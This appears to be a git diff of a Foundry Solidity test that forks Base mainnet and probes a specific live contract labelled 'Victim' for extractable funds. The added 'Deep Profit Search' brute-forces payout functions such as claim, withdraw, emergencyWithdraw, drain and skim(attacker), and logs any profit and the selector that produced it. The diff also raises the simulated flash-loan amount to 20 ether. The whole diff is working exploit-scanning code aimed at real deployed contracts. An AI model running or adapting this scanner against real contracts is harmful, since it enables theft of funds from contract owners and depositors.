@@ -6,11 +6,11 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
 contract HoneypotTestETH is Test {
-    address victim = 0xd40328e1c0D9765FeF6d1F34c9ddb1DC07973403;
+    address victim = 0xB4883246B73F53A03814713022553eAA2f87e772;
     address attacker = address(0x1337);
     
     function setUp() public {
-        vm.createSelectFork("https://base.gateway.tenderly.co");
+        vm.createSelectFork("https://mainnet.base.org");
         vm.label(victim, "Victim");
         vm.label(attacker, "Attacker");
     }
@@ -21,7 +21,7 @@ contract HoneypotTestETH is Test {
         console.log("Contract ETH Balance:", address(victim).balance);
 
         
-        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
+        // Adaptive Simulation for Sequencer Fee (Deep Profit Search)
         // Ensure tx.origin is attacker for refund checks
         vm.stopPrank();
         vm.startPrank(attacker, attacker);
@@ -47,16 +47,60 @@ contract HoneypotTestETH is Test {
         }
 
         // 2. Fallback probing if no profit found (or failed)
-        // Try sending 1 wei to contract address (no data)
         if (!profitFound) {
-             // Reset balance for clean check (optional, but let's just check relative gain)
+             // Try sending 1 wei to contract address (no data)
              uint256 balCheck = attacker.balance;
              (sfSuccess, ) = victim.call{value: 1 wei}("");
-             if (sfSuccess) {
-                 if (attacker.balance > balCheck) {
+             if (sfSuccess && attacker.balance > balCheck) {
+                 profitFound = true;
+                 console.log("PROFIT_WEI:", attacker.balance - balCheck);
+                 console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
+             }
+        }
+
+        // 3. Deep Profit Search (Brute-force common payout selectors)
+        if (!profitFound) {
+             bytes4[16] memory selectors = [
+                bytes4(keccak256("getReward()")),
+                bytes4(keccak256("claim()")),
+                bytes4(keccak256("claimReward()")),
+                bytes4(keccak256("distribute()")),
+                bytes4(keccak256("harvest()")),
+                bytes4(keccak256("skim(address)")),
+                bytes4(keccak256("recover()")),
+                bytes4(keccak256("refund()")),
+                bytes4(keccak256("emergencyWithdraw()")),
+                bytes4(keccak256("withdrawAll()")),
+                bytes4(keccak256("withdraw()")),
+                bytes4(keccak256("exit()")),
+                bytes4(keccak256("collect()")),
+                bytes4(keccak256("redeem()")),
+                bytes4(keccak256("sweep()")),
+                bytes4(keccak256("drain()"))
+             ];
+
+             for (uint i = 0; i < selectors.length; i++) {
+                 uint256 balCheck = attacker.balance;
+                 bool s;
+                 
+                 // Try with 0 value
+                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
+                 if (!s) {
+                     // Try with 1 wei
+                     (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
+                 }
+                 // Try specialized args for skim/recover
+                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) {
+                     (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));
+                 }
+
+                 if (s && attacker.balance > balCheck) {
                      profitFound = true;
-                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
-                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
+                     console.log("PROFIT_WEI:", attacker.balance - balCheck);
+                     console.log("SUCCESS_METHOD: deep_search"); 
+                     console.log("SELECTOR:");
+                     console.logBytes4(selectors[i]);
+                     break;
                  }
              }
         }
@@ -77,7 +121,7 @@ contract HoneypotTestETH is Test {
         return;
     
         
-        uint256 amount = 1 wei; // Flash Loan Amount
+        uint256 amount = 20 ether; // Flash Loan Amount
         vm.deal(attacker, amount); 
         console.log("Flash Loan Mode: 20 ETH simulated");
         
